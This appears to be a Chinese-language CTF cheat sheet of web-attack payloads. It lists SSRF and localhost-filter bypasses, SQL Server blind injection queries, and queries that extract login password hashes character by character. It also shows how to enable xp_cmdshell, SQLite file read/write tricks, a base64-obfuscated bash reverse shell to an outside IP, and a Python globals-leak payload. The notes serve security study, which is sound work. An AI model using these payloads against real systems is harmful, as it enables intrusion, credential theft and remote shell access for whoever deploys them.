
# Web

## RCE 命令绕过

包含 www.baidu.com 通过 http://user:pass@host 格式绕过16进制/8进制

`www.baidu.com@127.0.0.2`

绕过 127.0.0.1 , 2-127都可以, 8进制
```txt
127.0.0.2
...
127.0.0.127

curl 127.0.0.0x02
ping 0x7F.0x00.0x00.0x01
ping 0x7F000001
ping 0177.0000.0000.0001
```

## SSRF

1. 不存在路径绕过

`url=/http/../flag`

2. 通过127.0.0.2 ... 127


## curl 使用
curl -i -L
```txt
-i, --include       Incluude protocol response headers in the output
-L, --location      Follow redirects
```


# SQL 注入

## SQL Server
https://www.w3schools.com/sql/sql_ref_sqlserver.asp

```sql
-- db name
Select Name From Master..SysDataBases Where DbId=(Select Dbid From Master..SysProcesses Where Spid = @@spid)
-- stack query
-- if else
SELECT IIF(500<1000, 'YES', 'NO');
if (1=1) waitfor delay '00:00:1' else select 2
-- blind
?id=1' waitfor delay '00:00:2'--'

-- current-user
select CURRENT_USER;
select SYSTEM_USER;
select USER_NAME();

-- functions
ascii,char,charindex,concat,concat with +,concat_ws,datalength,difference,format,left,len,lower,ltrim,nchar,patindex,quotename,replace,replicate,reverse,right,rtrim,soundex,space,str,stuff,substring,translate,trim,unicode,upper
select case when 1=1 then 0 else 2 end  -- if else 
if (1<0) Begin select 'true' End Else Begin select 'false' End -- if else 2

-- sa passwords
select *  FROM master.sys.sql_logins
select *  FROM [master].[sys].[sql_logins]
SELECT name, CAST(CONVERT(varchar(max), password_hash, 1) AS varchar)  FROM master.sys.sql_logins -- 0x0102  https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-ver16
SELECT name, CAST(CONVERT(varchar(max), password_hash, 2) AS varchar)  FROM master.sys.sql_logins -- 0102

select case when  ascii(SUBSTRING(CAST(CONVERT(varchar(max), password_hash, 2) AS varchar), 1, 1))=48  then 1 else 2 end FROM master.sys.sql_logins -- 判断第二位是否为0
select case when  ascii(SUBSTRING(CAST(CONVERT(varchar(max), password_hash, 2) AS varchar), 2, 1))=49  then 1 else 2 end FROM master.sys.sql_logins -- 判断第二位是否为1


SELECT HOST_NAME()  -- 主机名
SELECT HOST_NAME() AS HostName, SUSER_NAME() LoggedInUser -- SUSER_NAME sa
-- 在master - 视图里
```

启动 xp_cmdshell
```
sp_configure 'show advanced options',1
reconfigure
go
sp_configure 'xp_cmdshell',1
reconfigure
go
```
## sqlite

```sql
sqlite3.exe db.sqlite3 -cmd SELECT(name)FROM(sqlite_master)
# 查表名
SELECT name FROM sqlite_master WHERE type='table';
SELECT CHAR(97);  -- 'a'
SELECT HEX('a');  -- 61

-- 2022第五空间 5_Misc_m@sTeR_0f
SELECT writefile('/home/ctf/'||CHAR(46)||'sqliterc',"select readfile('/flag'||CHAR(46)||'txt')")
select sqlite_version()

select readfile('/etc/passwd')
select writefile('/home/ctf/'||(SELECT substr(sqlite_version(),2,1))||'sqliterc',
(SELECT substr(sqlite_version(),2,1)||'shell echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjAuMjYuNTkuMTM3Lzg4ODggMD4mMQo=|base64 -d|bash'))
```
# Python

```
{0.__class__.__init__.__globals__}
```
# Javascript

弱类型
```ts
[]  ==  0   // true
[]  ==  ''  // true
[2] ==  2   // true
[0] ==  0   // true
[0] == "0"  // true
[0] ==="0"  // false
"0" !== [0] // true
123+"hello"    // '123hello'
[123]+"hello"  // '123hello'
"123"+"hello"  // '123hello'
```

nodejs中的jwt库在签名时用algorithm指定算法，而在验签时用algorithms指定算法
在测试jwt相关的安全问题时可以使用burpsuite的JOSEPH插件辅助测试


# Article

[无字母数字RCE初探](http://www.m0x01sery.com/2022/03/28/rce-without-w-and-n/) 
[【安全练兵场】| BurpSuite靶场系列之SQL注入](https://mp.weixin.qq.com/s/RqB-vMifxn0-4hrn0OEoHQ)
[【安全练兵场】| BurpSuite靶场系列之身份验证](https://mp.weixin.qq.com/s/wDWcdTdFRkI8cMK1_pv94w)
## SRC
[Java代码分析工具Tabby在CTF中的运用](https://mp.weixin.qq.com/s/u7RuSmBHy76R7_PqL8WJww)
[挖洞思路：前端源码泄露漏洞并用source map文件还原](https://blog.csdn.net/qq_44930903/article/details/124257571)
